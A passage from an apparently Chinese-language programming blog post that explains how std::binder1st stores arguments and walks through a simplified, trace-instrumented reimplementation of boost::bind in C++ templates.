class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Arg, <span class="keyword">typename</span> _Result&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unary_function2</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> _Arg argument_type;</span><br><span class="line">	<span class="keyword">typedef</span> _Result result_type;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Operation&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">binder1st2</span>:</span> <span class="keyword">public</span> unary_function2&lt;</span><br><span class="line">		<span class="keyword">typename</span> _Operation::second_argument_type,</span><br><span class="line">		<span class="keyword">typename</span> _Operation::result_type&gt; &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	_Operation op;</span><br><span class="line">	<span class="keyword">typename</span> _Operation::first_argument_type value;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	binder1st2(<span class="keyword">const</span> _Operation&amp; __x,</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">typename</span> _Operation::first_argument_type&amp; __y) :</span><br><span class="line">			op(__x), value(__y) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">typename</span> _Operation::result_type <span class="title">operator</span><span class="params">()</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">const</span> <span class="keyword">typename</span> _Operation::second_argument_type&amp; __x)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> op(value, __x);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">typename</span> _Operation::result_type <span class="title">operator</span><span class="params">()</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">typename</span> _Operation::second_argument_type&amp; __x)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> op(value, __x);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Operation, <span class="keyword">typename</span> _Tp&gt;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> binder1st2&lt;_Operation&gt; <span class="title">bind1st2</span><span class="params">(<span class="keyword">const</span> _Operation&amp; __fn, <span class="keyword">const</span> _Tp&amp; __x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> _Operation::first_argument_type _Arg1_type;</span><br><span class="line">	<span class="keyword">return</span> binder1st2&lt;_Operation&gt;(__fn, _Arg1_type(__x));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function">binder1st2&lt;equal_to2&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">equal_to_10</span><span class="params">(equal_to2&lt;<span class="keyword">int</span>&gt;(), <span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="keyword">int</span> numbers[] = &#123; <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">10</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> cx;</span><br><span class="line">	cx = <span class="built_in">std</span>::count_if(numbers, numbers + <span class="number">6</span>, bind1st(equal_to2&lt;<span class="keyword">int</span>&gt;(), <span class="number">10</span>));</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"There are "</span> &lt;&lt; cx &lt;&lt; <span class="string">" elements that are equal to 10.\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的实现还是比较简单的，希望还没有看晕。:)</p>
<p>从代码可以看出binder1st的实现，实制上是把参数保存起来，等到调用时，再取出来使用。</p>
<p>boost::bind从原理上来说，也是这么回事，但是要复杂得多。</p>
<h2 id="解析简化版bind2"><a href="#解析简化版bind2" class="headerlink" title="解析简化版bind2"></a>解析简化版bind2</h2><p>下面是从boost::bind源码中抠出来的，一个简单的bind的实现（bind改为bind2），主流编译器应该都可以编统执行。</p>
<p>为了方便理解程序运行过程，代码中增加了一些cout输出。</p>
<p>myBind.h：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BOOST_BIND_BIND_HPP_INCLUDED__Mybind</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BOOST_BIND_BIND_HPP_INCLUDED__Mybind</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">namespace</span> boost &#123;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">struct</span> <span class="title">is_placeholder</span> &#123;</span></span><br><span class="line">	<span class="keyword">enum</span> _vt &#123;</span><br><span class="line">		value = <span class="number">0</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">int</span> I&gt; <span class="class"><span class="keyword">struct</span> <span class="title">arg</span> &#123;</span></span><br><span class="line">	arg() &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">type</span> &#123;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> _bi <span class="comment">// implementation details</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">struct</span> <span class="title">storage1</span> &#123;</span></span><br><span class="line">	<span class="function"><span class="keyword">explicit</span> <span class="title">storage1</span><span class="params">(A1 a1)</span> :</span></span><br><span class="line"><span class="function">			<span class="title">a1_</span><span class="params">(a1)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage1  storage1(A1 a1)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	A1 a1_;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">int</span> I&gt; <span class="class"><span class="keyword">struct</span> <span class="title">storage1</span>&lt;boost::arg&lt;I&gt; &gt; &#123;</span></span><br><span class="line">	<span class="function"><span class="keyword">explicit</span> <span class="title">storage1</span><span class="params">(boost::arg&lt;I&gt;)</span> </span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage1  storage1(boost::arg&lt;I&gt;)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> boost::arg&lt;I&gt; <span class="title">a1_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> boost::arg&lt;I&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">int</span> I&gt; <span class="class"><span class="keyword">struct</span> <span class="title">storage1</span>&lt;boost::arg&lt;I&gt; (*)()&gt; &#123;</span></span><br><span class="line">	<span class="function"><span class="keyword">explicit</span> <span class="title">storage1</span><span class="params">(boost::arg&lt;I&gt; (*)())</span> </span>&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage1  storage1(boost::arg&lt;I&gt; (*)())"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> boost::arg&lt;I&gt; <span class="title">a1_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> boost::arg&lt;I&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt; <span class="title">struct</span> <span class="title">storage2</span>:</span> <span class="keyword">public</span> storage1&lt;A1&gt; &#123;</span><br><span class="line">	<span class="keyword">typedef</span> storage1&lt;A1&gt; inherited;</span><br><span class="line">	storage2(A1 a1, A2 a2) :</span><br><span class="line">			storage1&lt;A1&gt;(a1), a2_(a2) &#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage2  storage2(A1 a1, A2 a2)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	A2 a2_;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">int</span> <span class="title">I</span>&gt; <span class="title">struct</span> <span class="title">storage2</span>&lt;A1, boost::arg&lt;I&gt; &gt; :</span> <span class="keyword">public</span> storage1&lt;</span><br><span class="line">		A1&gt; &#123;</span><br><span class="line">	<span class="keyword">typedef</span> storage1&lt;A1&gt; inherited;</span><br><span class="line">	storage2(A1 a1, boost::arg&lt;I&gt;) :</span><br><span class="line">			storage1&lt;A1&gt;(a1) &#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage2  storage2(A1 a1, boost::arg&lt;I&gt;)"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> boost::arg&lt;I&gt; <span class="title">a2_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> boost::arg&lt;I&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">int</span> <span class="title">I</span>&gt; <span class="title">struct</span> <span class="title">storage2</span>&lt;A1, boost::arg&lt;I&gt; (*)()&gt; :</span> <span class="keyword">public</span> storage1&lt;</span><br><span class="line">		A1&gt; &#123;</span><br><span class="line">	<span class="keyword">typedef</span> storage1&lt;A1&gt; inherited;</span><br><span class="line">	storage2(A1 a1, boost::arg&lt;I&gt; (*)()) :</span><br><span class="line">			storage1&lt;A1&gt;(a1) &#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"storage2  storage2(A1 a1, boost::arg&lt;I&gt; (*)())"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> boost::arg&lt;I&gt; <span class="title">a2_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> boost::arg&lt;I&gt;();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// result_traits</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">F</span>&gt; <span class="title">struct</span> <span class="title">result_traits</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> R type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unspecified</span> &#123;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">F</span>&gt; <span class="title">struct</span> <span class="title">result_traits</span>&lt;unspecified, F&gt; &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> F::result_type type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// value</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">class</span> <span class="title">value</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	value(T <span class="keyword">const</span> &amp; t) :</span><br><span class="line">			t_(t) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">T &amp; <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> t_;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T t_;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// type</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">class</span> <span class="title">type</span> &#123;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// unwrap</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">F</span>&gt; <span class="title">struct</span> <span class="title">unwrapper</span> &#123;</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> F &amp; <span class="title">unwrap</span><span class="params">(F &amp; f, <span class="keyword">long</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> f;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// listN</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">list0</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	list0() &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> &amp; <span class="title">operator</span>[](_<span class="title">bi</span>:</span>:value&lt;T&gt; &amp; v) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list0  T &amp; operator[](_bi::value&lt;T&gt; &amp; v)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> v.get();</span><br><span class="line">	&#125;</span><br><span class="line">	template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp;,</span><br><span class="line">			<span class="keyword">long</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list0  R operator()(type&lt;R&gt;, F &amp; f, A &amp;, long)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> unwrapper&lt;F&gt;::unwrap(f, <span class="number">0</span>)();</span><br><span class="line">	&#125;</span><br><span class="line">	template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp;, int) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list0  void operator()(type&lt;void&gt;, F &amp; f, A &amp;, int)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		unwrapper&lt;F&gt;::unwrap(f, <span class="number">0</span>)();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">class</span> <span class="title">list1</span>:</span> <span class="keyword">private</span> storage1&lt;A1&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">typedef</span> storage1&lt;A1&gt; base_type;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">explicit</span> <span class="title">list1</span><span class="params">(A1 a1)</span> :</span></span><br><span class="line"><span class="function">			<span class="title">base_type</span><span class="params">(a1)</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt;) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">	&#125;</span><br><span class="line">	A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt; (*)()) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> &amp; <span class="title">operator</span>[](_<span class="title">bi</span>:</span>:value&lt;T&gt; &amp; v) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> v.get();</span><br><span class="line">	&#125;</span><br><span class="line">	template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a,</span><br><span class="line">			<span class="keyword">long</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> unwrapper&lt;F&gt;::unwrap(f, <span class="number">0</span>)(a[base_type::a1_]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//	template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp; a, int) &#123;</span></span><br><span class="line"><span class="comment">//		unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_]);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt; <span class="title">class</span> <span class="title">list2</span>:</span> <span class="keyword">private</span> storage2&lt;A1, A2&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">typedef</span> storage2&lt;A1, A2&gt; base_type;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	list2(A1 a1, A2 a2) :</span><br><span class="line">			base_type(a1, a2) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt;) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;1&gt;)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">	&#125;</span><br><span class="line">	A2 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">2</span>&gt;) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;2&gt;)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> base_type::a2_;</span><br><span class="line">	&#125;</span><br><span class="line">	A1 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">1</span>&gt; (*)()) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;1&gt; (*)())"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> base_type::a1_;</span><br><span class="line">	&#125;</span><br><span class="line">	A2 <span class="keyword">operator</span>[](boost::arg&lt;<span class="number">2</span>&gt; (*)()) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"list2  A1 operator[](boost::arg&lt;2&gt; (*)())"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> base_type::a2_;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">T</span> &amp; <span class="title">operator</span>[](_<span class="title">bi</span>:</span>:value&lt;T&gt; &amp; v) <span class="keyword">const</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"T &amp; operator[](_bi::value&lt;T&gt; &amp; v)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> v.get();</span><br><span class="line">	&#125;</span><br><span class="line">	template&lt;class R, class F, class A&gt; R operator()(type&lt;R&gt;, F &amp; f, A &amp; a,</span><br><span class="line">			<span class="keyword">long</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> f(a[base_type::a1_], a[base_type::a2_]);</span><br><span class="line"><span class="comment">//		return unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]);</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//	template&lt;class F, class A&gt; void operator()(type&lt;void&gt;, F &amp; f, A &amp; a, int) &#123;</span></span><br><span class="line"><span class="comment">//		unwrapper&lt;F&gt;::unwrap(f, 0)(a[base_type::a1_], a[base_type::a2_]);</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// bind_t</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">F</span>, <span class="title">class</span> <span class="title">L</span>&gt; <span class="title">class</span> <span class="title">bind_t</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">bind_t</span> this_type;</span><br><span class="line">	<span class="keyword">bind_t</span>(F f, L <span class="keyword">const</span> &amp; l) :</span><br><span class="line">			f_(f), l_(l) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> result_traits&lt;R, F&gt;::type result_type;</span><br><span class="line">	<span class="function">result_type <span class="title">operator</span><span class="params">()</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"bind_t::result_type operator()()"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		list0 a;</span><br><span class="line">		<span class="keyword">return</span> l_(type&lt;result_type&gt;(), f_, a, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">template</span>&lt;class A1&gt; result_type <span class="title">operator</span><span class="params">()</span><span class="params">(A1 &amp; a1)</span> </span>&#123;</span><br><span class="line">		<span class="function">list1&lt;A1 &amp;&gt; <span class="title">a</span><span class="params">(a1)</span></span>;</span><br><span class="line">		<span class="keyword">return</span> l_(type&lt;result_type&gt;(), f_, a, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	template&lt;class A1, class A2&gt; result_type operator()(A1 &amp; a1, A2 &amp; a2) &#123;</span><br><span class="line">		list2&lt;A1 &amp;, A2 &amp;&gt; a(a1, a2);</span><br><span class="line">		<span class="keyword">return</span> l_(type&lt;result_type&gt;(), f_, a, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	F f_;</span><br><span class="line">	L l_;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">int</span> <span class="title">I</span>&gt; <span class="title">struct</span> <span class="title">add_value_2</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> boost::arg&lt;I&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">struct</span> <span class="title">add_value_2</span>&lt;T, 0&gt; &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> _bi::value&lt;T&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">struct</span> <span class="title">add_value</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> add_value_2&lt;T, boost::is_placeholder&lt;T&gt;::value&gt;::type type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; <span class="title">struct</span> <span class="title">add_value</span>&lt;value&lt;T&gt; &gt; &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> _bi::value&lt;T&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">int</span> I&gt; <span class="class"><span class="keyword">struct</span> <span class="title">add_value</span>&lt;arg&lt;I&gt; &gt; &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> boost::arg&lt;I&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//template&lt;int I&gt; struct add_value&lt;arg&lt;I&gt; (*)()&gt; &#123;</span></span><br><span class="line"><span class="comment">//	typedef boost::arg&lt;I&gt; (*type)();</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">F</span>, <span class="title">class</span> <span class="title">L</span>&gt; <span class="title">struct</span> <span class="title">add_value</span>&lt;bind_t&lt;R, F, L&gt; &gt; &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">bind_t</span>&lt;R, F, L&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// list_av_N</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>&gt; <span class="title">struct</span> <span class="title">list_av_1</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> add_value&lt;A1&gt;::type B1;</span><br><span class="line">	<span class="keyword">typedef</span> list1&lt;B1&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt; <span class="title">struct</span> <span class="title">list_av_2</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> add_value&lt;A1&gt;::type B1;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> add_value&lt;A2&gt;::type B2;</span><br><span class="line">	<span class="keyword">typedef</span> list2&lt;B1, B2&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; <span class="comment">// namespace _bi</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// function pointers</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>&gt;</span></span><br><span class="line">_bi::bind_t&lt;R, R (*)(), _bi::list0&gt; bind2(R (*f)()) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">R</span> <span class="params">(*F)</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="keyword">typedef</span> _bi::list0 list_type;</span><br><span class="line">	<span class="keyword">return</span> _bi::<span class="keyword">bind_t</span>&lt;R, F, list_type&gt;(f, list_type());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">B1</span>, <span class="title">class</span> <span class="title">A1</span>&gt;</span></span><br><span class="line">_bi::bind_t&lt;R, R (*)(B1), typename _bi::list_av_1&lt;A1&gt;::type&gt; bind2(R (*f)(B1),</span><br><span class="line">		A1 a1) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">R</span> <span class="params">(*F)</span><span class="params">(B1)</span></span>;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> _bi::list_av_1&lt;A1&gt;::type list_type;</span><br><span class="line">	<span class="keyword">return</span> _bi::<span class="keyword">bind_t</span>&lt;R, F, list_type&gt;(f, list_type(a1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">R</span>, <span class="title">class</span> <span class="title">B1</span>, <span class="title">class</span> <span class="title">B2</span>, <span class="title">class</span> <span class="title">A1</span>, <span class="title">class</span> <span class="title">A2</span>&gt;</span></span><br><span class="line">_bi::bind_t&lt;R, R (*)(B1, B2), typename _bi::list_av_2&lt;A1, A2&gt;::type&gt; bind2(</span><br><span class="line">		R (*f)(B1, B2), A1 a1, A2 a2) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">R</span> <span class="params">(*F)</span><span class="params">(B1, B2)</span></span>;</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">typename</span> _bi::list_av_2&lt;A1, A2&gt;::type list_type;</span><br><span class="line">	<span class="keyword">return</span> _bi::<span class="keyword">bind_t</span>&lt;R, F, list_type&gt;(f, list_type(a1, a2));</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="comment">// namespace boost</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">boost::arg&lt;<span class="number">1</span>&gt; _1;</span><br><span class="line">boost::arg&lt;<span class="number">2</span>&gt; _2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// #ifndef BOOST_BIND_BIND_HPP_INCLUDED__Mybind</span></span></span><br></pre></td></tr></table></figure>
<p>main.cpp：</p>
